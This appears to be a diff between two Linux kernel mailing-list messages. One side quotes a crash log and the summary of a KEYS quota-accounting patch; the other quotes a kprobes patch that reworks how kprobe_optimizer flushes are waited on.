-> [  291.622399][T10195]  ? lock_vma_under_rcu+0x143/0x980
-> [  291.622797][T10195]  __handle_mm_fault+0xfa3/0x2a10
-> [  291.623201][T10195]  ? __pfx_lock_release+0x10/0x10
-> [  291.623574][T10195]  ? down_read_trylock+0x1f0/0x3f0
-> [  291.623959][T10195]  ? __pfx___handle_mm_fault+0x10/0x10
-> [  291.624373][T10195]  ? __pfx_down_read_trylock+0x10/0x10
-> [  291.624818][T10195]  ? __pfx_lock_vma_under_rcu+0x10/0x10
-> [  291.625252][T10195]  handle_mm_fault+0x3f5/0xa00
-> [  291.625639][T10195]  do_user_addr_fault+0x50a/0x1490
-> [  291.626067][T10195]  exc_page_fault+0x5d/0xe0
-> [  291.626421][T10195]  asm_exc_page_fault+0x26/0x30
-> [  291.626781][T10195] RIP: 0033:0x7f7f7505e080
-> [  291.627107][T10195] Code: Unable to access opcode bytes at 0x7f7f7505e=
-056.
-> [  291.627583][T10195] RSP: 002b:00007ffc585a1b08 EFLAGS: 00010202
-> [  291.628015][T10195] RAX: 00007ffc585a2120 RBX: 00007ffc585a2040 RCX: 0=
-000000000000002
-> [  291.628553][T10195] RDX: 00007ffc585a2100 RSI: 0000000000000025 RDI: 0=
-000560a6a8580a7
-> [  291.629082][T10195] RBP: 00007ffc585a2210 R08: 00007ffc585a2230 R09: 0=
-000000000000058
-> [  291.629623][T10195] R10: 00007ffc585a2210 R11: 0000000000000246 R12: 0=
-000560a6bf4d2a0
-> [  291.630161][T10195] R13: 0000560a6bf5d0b0 R14: 00007ffc585a2100 R15: 0=
-000560a6a8580a7
-> [  291.630738][T10195]  </TASK>
-> [  291.631265][T10195] Kernel Offset: disabled
-> [  291.631642][T10195] Rebooting in 86400 seconds..
->
-> -----END crash log-----
->
-> Best regards,
-> Yuqi Xu
->
-> Yuqi Xu (1):
->   KEYS: Account for asymmetric key payload data in the quota
->
->  crypto/asymmetric_keys/pkcs8_parser.c    |  2 +-
->  crypto/asymmetric_keys/x509_public_key.c | 23 ++++++++++++++++++++++-
->  2 files changed, 23 insertions(+), 2 deletions(-)
->
->
-> base-commit: 10396a2d6d41d594975b6ece712278570c3c970c
-> --
-> 2.55.0
->
->
+> 
+>  - Josef's "kprobes: Expose the optprobe jump window to Tasks RCU" [2]
+>    changes kprobe_optimizer() around synchronize_rcu_tasks(); its
+>    kernel/kprobes.c hunks still apply on top of this patch.
+> 
+> [1] https://lore.kernel.org/all/179017148080.466588.9116221556625712980.stgit@devnote2/
+> [2] https://lore.kernel.org/all/20260922-b4-rcu-tasks-preempt-qs-v5-3-410f57770bad@toxicpanda.com/
+> 
+>  kernel/kprobes.c | 22 ++++++++++++++--------
+>  1 file changed, 14 insertions(+), 8 deletions(-)
+> 
+> diff --git a/kernel/kprobes.c b/kernel/kprobes.c
+> index 6337da5cab9e7..4edd8ca5c6578 100644
+> --- a/kernel/kprobes.c
+> +++ b/kernel/kprobes.c
+> @@ -42,6 +42,7 @@
+>  #include <linux/execmem.h>
+>  #include <linux/cleanup.h>
+>  #include <linux/wait.h>
+> +#include <linux/wait_bit.h>
+>  
+>  #include <asm/sections.h>
+>  #include <asm/cacheflush.h>
+> @@ -526,7 +527,8 @@ enum {
+>  	OPTIMIZER_ST_FLUSHING = 2,
+>  };
+>  
+> -static DECLARE_COMPLETION(optimizer_completion);
+> +/* Bumped at the end of each kprobe_optimizer() pass, under 'kprobe_mutex' */
+> +static unsigned long optimizer_passes;
+>  
+>  #define OPTIMIZE_DELAY 5
+>  
+> @@ -654,9 +656,9 @@ static void kprobe_optimizer(void)
+>  		do_free_cleaned_kprobes();
+>  	}
+>  
+> -	/* Step 5: Kick optimizer again if needed. But if there is a flush requested, */
+> -	if (completion_done(&optimizer_completion))
+> -		complete(&optimizer_completion);
+> +	/* Step 5: Wake up flushers, and kick optimizer again if needed. */
+> +	optimizer_passes++;
+> +	wake_up_var_locked(&optimizer_passes, &kprobe_mutex);
+>  
+>  	if (!list_empty(&optimizing_list) || !list_empty(&unoptimizing_list))
+>  		kick_kprobe_optimizer();	/*normal kick*/
+> @@ -708,7 +710,8 @@ static void wait_for_kprobe_optimizer_locked(void)
+>  	lockdep_assert_held(&kprobe_mutex);
+>  
+>  	while (!list_empty(&optimizing_list) || !list_empty(&unoptimizing_list)) {
+> -		init_completion(&optimizer_completion);
+> +		unsigned long passes = optimizer_passes;
+> +
+>  		/*
+>  		 * Set state to OPTIMIZER_ST_FLUSHING and wake up the thread if it's
+>  		 * idle. If it's already kicked, it will see the state change.
+> @@ -717,9 +720,12 @@ static void wait_for_kprobe_optimizer_locked(void)
+>  			OPTIMIZER_ST_FLUSHING) != OPTIMIZER_ST_FLUSHING)
+>  			wake_up(&kprobe_optimizer_wait);
+>  
+> -		mutex_unlock(&kprobe_mutex);
+> -		wait_for_completion(&optimizer_completion);
+> -		mutex_lock(&kprobe_mutex);
+> +		/*
+> +		 * kprobe_optimizer() holds 'kprobe_mutex' for a whole pass, which
+> +		 * this drops while sleeping, so a new count means a full pass ran.
+> +		 */
+> +		wait_var_event_mutex(&optimizer_passes,
+> +				     optimizer_passes != passes, &kprobe_mutex);
+>  	}
+>  }
+>  
+> -- 
+> 2.53.0
+> 
 
-Thanks
+
+-- 
+Masami Hiramatsu (Google) <mhiramat@kernel.org>
